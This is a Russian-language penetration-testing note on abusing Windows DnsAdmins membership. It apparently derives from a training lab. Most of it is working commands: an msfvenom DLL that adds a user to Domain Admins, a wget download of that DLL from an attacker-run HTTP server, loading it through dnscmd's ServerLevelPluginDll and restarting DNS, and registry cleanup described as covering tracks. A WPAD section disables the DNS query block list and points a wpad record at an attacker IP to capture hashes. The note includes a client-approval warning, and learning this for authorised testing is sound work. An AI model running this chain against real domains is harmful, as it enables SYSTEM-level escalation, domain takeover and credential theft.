#group #AD #windows #privillage #lpe #dns 

> Члены группы DnsAdmins имеют доступ к информации DNS в сети.

> Служба DNS работает от `NT AUTHORITY\SYSTEM`, поэтому ее компрометация приводит к LPE

# Атака на DNS Сервер (Если он расположен на DC)

<span style="background:#ff4d4f">Внесение изменений в конфигурацию и остановка/перезапуск службы DNS на контроллере домена — это крайне опасные действия, требующие большой осторожности. Как специалисты по тестированию на проникновение, мы должны согласовать этот тип действий с клиентом, прежде чем приступать к нему, поскольку он потенциально может привести к отключению DNS для всей среды Active Directory и вызвать множество проблем. Если клиент даст разрешение на проведение этой атаки, мы должны быть в состоянии либо замести следы и устранить последствия, либо предоставить клиенту инструкции по отмене изменений.</span>

<span style="background:#ff4d4f">Эти действия необходимо выполнять с консоли с правами администратора (локального или доменного).</span>


> только член DNS Admins может выполнить эту атаку
```powershell
Get-ADGroupMember -Identity DnsAdmins
```

#### 1) Создание вредоносной DLL-библиотеки

Создаем файл для добавления пользователя в группу `domain admins`
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll
```
#### 2) Запуск локального HTTP-сервера
```bash
python3 -m http.server 7777
```
#### 3) Загрузка файла в целевое устройство
```powershell
wget "http://<ip:port>/adduser.dll" -outfile "adduser.dll"
```
#### 4) Загрузка вредоносной DLL

<span style="background:#b1ffff">Примечание: Необходимо указать полный путь к нашей пользовательской DLL-библиотеке, иначе атака не будет работать должным образом.</span>
```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
на этом этапе мы успешно загрузили нашу библиотеку в реестр, она будет успешно запущена после перезапуска службы DNS 

#### 5) Перезапуск службы DNS 

cmd
```cmd
sc stop dns
sc start dns
```

powershell
```powershell
Restart-Service DNS
```

#### <span style="background:rgba(205, 244, 105, 0.55)"> 6) Заметение следов</span>

Проверяем что наша dll загружена
```cmd
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

Удаляем ключ из реестра
```cmd
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

Перехапускаем службу DNS и проверяем ее работоспособность
```cmd
sc.exe start dns

sc query dns



# SERVICE_NAME: dns
#        TYPE               : 10  WIN32_OWN_PROCESS
```
<span style="background:#affad1">		   STATE              : 4  RUNNING</span>
<span style="background:#affad1">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span>
```                                
#        WIN32_EXIT_CODE    : 0  (0x0)
#        SERVICE_EXIT_CODE  : 0  (0x0)
#        CHECKPOINT         : 0x0
#        WAIT_HINT          : 0x0
```


# Проведение MiTM атаки через WPAD

Еще один способ злоупотребления привилегиями группы DnsAdmins — создание записи WPAD.

> Членство в этой группе дает нам право отключать глобальную защиту блоков запросов , которая по умолчанию блокирует эту атаку. 

По умолчанию протоколы Web Proxy Automatic Discovery Protocol (WPAD) и Intra-site Automatic Tunnel Addressing Protocol (ISATAP) находятся в глобальном списке блокировки запросов. Эти протоколы весьма уязвимы для перехвата, и любой пользователь домена может создать объект компьютера или запись DNS, содержащую эти имена.

После отключения глобального списка блокировки запросов и создания записи WPAD, трафик каждой машины, работающей с WPAD с настройками по умолчанию, будет перенаправляться через нашу атакующую машину. Мы могли бы использовать такие инструменты, как [Responder](https://github.com/lgandx/Responder) или [Inveigh,](https://github.com/Kevin-Robertson/Inveigh) для подмены трафика и попытки перехватить хеши паролей и взломать их в автономном режиме или выполнить атаку SMBRelay.


#### Отключение глобального списка блокировки запросов
```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
#### Добавление записи WPAD
```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

